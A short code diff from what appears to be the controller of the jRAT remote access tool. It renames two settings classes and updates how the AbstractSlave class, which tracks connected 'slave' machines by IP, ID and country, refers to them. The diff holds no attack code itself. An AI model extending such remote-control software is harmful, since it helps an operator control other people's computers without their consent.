@@ -20,8 +20,8 @@ import se.jrat.client.io.CountingInputStream;
 import se.jrat.client.io.CountingOutputStream;
 import se.jrat.client.ip2c.Country;
 import se.jrat.client.net.ServerListener;
-import se.jrat.client.settings.CountryStatistics;
-import se.jrat.client.settings.CustomID;
+import se.jrat.client.settings.StatisticsCountry;
+import se.jrat.client.settings.SettingsCustomID;
 import se.jrat.client.settings.Settings;
 import se.jrat.client.utils.FlagUtils;
 import se.jrat.common.Version;
@@ -331,7 +331,7 @@ public abstract class AbstractSlave implements Runnable {
 	public void setServerID(String serverid) {
 		this.id = serverid;
 		
-		CustomID.CustomIDEntry entry = CustomID.getGlobal().findEntry(getRawIP());
+		SettingsCustomID.CustomIDEntry entry = SettingsCustomID.getGlobal().findEntry(getRawIP());
 		
 		if (entry != null) {
 			setRenamedID(entry.getName());
@@ -396,7 +396,7 @@ public abstract class AbstractSlave implements Runnable {
 	public void setCountry(String country) {
 		this.country = country;
 				
-		CountryStatistics.getGlobal().add(this);
+		StatisticsCountry.getGlobal().add(this);
 	}
 
 	public void setOperatingSystem(AbstractOperatingSystem os) {
